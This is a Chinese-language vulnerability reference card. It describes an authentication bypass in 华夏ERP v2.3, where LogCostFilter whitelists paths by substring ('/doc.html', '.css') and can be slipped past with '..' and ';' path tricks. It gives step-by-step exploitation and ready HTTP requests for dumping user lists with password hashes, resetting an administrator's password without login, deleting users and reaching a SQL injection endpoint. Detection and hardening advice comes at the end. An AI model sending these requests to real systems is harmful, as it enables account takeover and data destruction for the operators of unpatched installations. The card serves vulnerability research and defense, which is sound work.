---
id: web-generic-auth-xiahuia-erp-logcostfilter-contains-path-bypass
title: 华夏ERP LogCostFilter 用 contains 判断 /doc.html 白名单，路径穿越与静态后缀绕过未授权
type: scenario
domain: web
path: web/generic/auth
technique: filter-contains-whitelist-path-normalization-bypass
aliases:
- 华夏ERP 未授权访问
- LogCostFilter 绕过
- doc.html 白名单绕过
- .css 静态后缀绕过
- contains 鉴权绕过
tags:
- java
- spring
- filter
- auth-bypass
- path-traversal
- uri-normalization
- whitelist
- xiahuia
cve: []
severity: critical
confidence: high
affected_versions: 华夏ERP v2.3（原文测试版本）
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V38
  verified_at: '2026-11-05T06:01:04+08:00'
  notes: 已通读原文并逐张核对41张图：LogCostFilter @WebFilter filterPath=/user/login#/user/registerUser#/v2/api-docs、ignoredUrl=.css#.js#...#.ico、doFilter 的 session contains 静态后缀 startsWith 顺序与卡一致；实测 /doc.html/../user/getAllList、/doc.html/..;/user/getAllList、/.css/../user/getAllList 均 200 返回含密码哈希用户列表，resetPwd/deleteUser 无二次鉴权可未授权，addUser 因 Session userNumLimit 为空不可用，均与卡一致。版本为原文审计目标 v2.3（卡内标注原文测试版本）。frontmatter 无 sources/source_url；未在本机复跑。
---

## 一句话结论

华夏ERP v2.3 的 `LogCostFilter` 用 `requestUrl.contains("/doc.html")`、`contains("/register.html")`、`contains("/login.html")` 以及静态后缀 `.css/.js/...` 做放行；`getRequestURI()` 得到的是未规范化的原始路径，攻击者用 `/doc.html/../user/getAllList` 或 `/.css/../account/list` 让 Filter 看到白名单子串，而 Tomcat 规范化后路由到受保护接口，未登录即可读取全部用户（含密码哈希）、重置任意用户密码为 `123456`、删除用户。

## 原理

- `LogCostFilter`（`@WebFilter(urlPatterns={"/*"})`）的放行顺序：
  1. `session.getAttribute("user") != null` → 已登录放行；
  2. `requestUrl.contains("/doc.html") || contains("/register.html") || contains("/login.html")` → 放行；
  3. URL 命中 `ignoredList` 中的静态后缀（`.css`、`.js`、`.jpg` 等）→ 放行；
  4. `requestUrl.startsWith(allowUrl)`（`/user/login`、`/user/registerUser`、`/v2/api-docs`）→ 放行；
  5. 否则 `sendRedirect("/login.html")`。
- `requestUrl` 来自 `HttpServletRequest.getRequestURI()`，是客户端发送的原始请求目标，Tomcat 不会先把 `..`、`;` 规范化；而 Servlet 映射/Spring MVC 路由使用的是规范化后的路径。
- 因此：
  - `/doc.html/../user/getAllList`：Filter 因包含 `/doc.html` 放行；容器把 `/doc.html/..` 折叠回 `/`，最终路由到 `/user/getAllList`。
  - `/doc.html/..;/user/getAllList`：利用矩阵参数 `;` 与 `..` 的组合，旧容器/配置下同样放行并规范化。
  - `/.css/../account/list`：Filter 因包含 `.css` 走静态资源放行；容器规范化后路由到 `/account/list`。
- 绕过 Filter 后，多数 Controller 没有二次会话/权限校验：`/user/getAllList` 直接返回用户列表（包含 `password` 的 MD5 哈希）、`/user/resetPwd` 直接把指定用户密码重置为 `123456`、`/user/deleteUser` 直接批量删除；只有 `/user/addUser` 因为要从 Session 取 `userNumLimit`，未登录 Session 为空而失败（NPE），所以添加用户不可未授权利用。
- 本质是“字符串白名单判断（contains/startsWith/endsWith）与路由规范化不一致”的通用鉴权缺陷。

## 触发条件

- 华夏ERP v2.3，`LogCostFilter` 启用并作为唯一鉴权手段。
- 目标接口位于受保护路径，但自身不校验 Session/角色（如 getAllList、resetPwd、deleteUser）。
- 容器会对 `..`、`;` 做路径规范化，且规范化后能匹配到目标接口。
- 静态资源白名单包含 `.css` 等可被插入路径中间的后缀。

## 利用步骤

1. 先在无 Cookie 情况下访问 `/user/getAllList`，确认 302 到 `/login.html`（被 Filter 拦截）。
2. 构造 `GET /doc.html/../user/getAllList`，确认返回 200 和用户列表。
3. 若 `..` 被拦截，改用 `/doc.html/..;/user/getAllList` 或 `/.css/../user/getAllList`。
4. 用返回的用户 ID 调用 `/user/resetPwd`（POST `id=<管理员id>`），把密码重置为 `123456`，再正常登录后台。
5. 或直接调用 `/user/deleteUser`（POST `ids=<id>`）删除用户；`/user/addUser` 因 Session 依赖失败，不作为利用点。
6. 把同样的绕过前缀套到 SQL 注入接口（如 `/account/list`），形成未授权注入。

## PoC

```http
GET /doc.html/../user/getAllList HTTP/1.1
Host: target:8080
X-Requested-With: XMLHttpRequest
Accept: application/json, text/javascript, */*; q=0.01
```

响应（原文）：

```json
{"code":200,"data":{"userList":[{"id":63,"username":"...","loginName":"jsh","password":"e10adc3949ba59abbe56e057f20f883e", ...}]}}
```

静态后缀变体：

```http
GET /.css/../account/list?currentPage=1&pageSize=15 HTTP/1.1
Host: target:8080
```

矩阵参数变体：

```http
GET /doc.html/..;/user/getAllList HTTP/1.1
Host: target:8080
```

重置密码（无需登录）：

```http
POST /user/resetPwd HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded

id=120
```

## 变体与关联

- 绕过变体：`/doc.html/../`、`/doc.html/..;/`、`/.css/../`，以及 URL 编码 `%2e%2e`、`//`、尾部 `/` 等，取决于容器/框架的规范化顺序。
- 利用面变体：绕过 Filter 后可访问任何未做二次鉴权的 Controller；原文验证 getAllList、resetPwd、deleteUser，addUser 因 Session 依赖不可用。
- 关联：[[web-generic-auth-interceptor-login-prefix-dotdot-bypass]]（startsWith 排除式白名单 + `..`）、[[web-generic-auth-jeewms-authinterceptor-whitelist-regex-contains-bypass]]（contains 子串白名单）、[[web-generic-auth-weaver-e9-islogin-xsslist-regex-bypass]]（正则放行）。
- 边界：若 Filter 使用规范化路径（`getServletPath()` 并解析 `..`）、或目标接口在 Controller 层再次鉴权、或容器直接拒绝 `..`/`;`，绕过失效。

## 检测与防御

- 检测：请求路径同时包含白名单片段（`/doc.html`、`.css` 等）和 `..`、`;`、`%2e`、`//`；同一接口正常路径 302 而变体 200。
- 检测：未登录 Session 访问 `/user/getAllList`、`/user/resetPwd`、`/user/deleteUser` 等敏感接口；响应含用户密码哈希或重置成功。
- 防御：鉴权使用容器/框架规范化后的路径与路由匹配（Spring Security `MvcRequestMatcher`、`AntPathMatcher`），不要用 `contains/startsWith/endsWith` 判断原始 URI。
- 防御：对路径先解码、去除 `;` 参数、解析 `.`/`..`、折叠 `//`，再做白名单比较；无法规范化则拒绝。
- 防御：敏感接口在 Controller/Service 层再次校验登录与角色；重置密码/删除用户需管理员权限与二次确认。
- 加固：启用 `StrictHttpFirewall` 类防护，拒绝 `;`、`%2e`、`//`、反斜杠；Filter 放行静态资源应基于规范化后的后缀且只允许 GET。
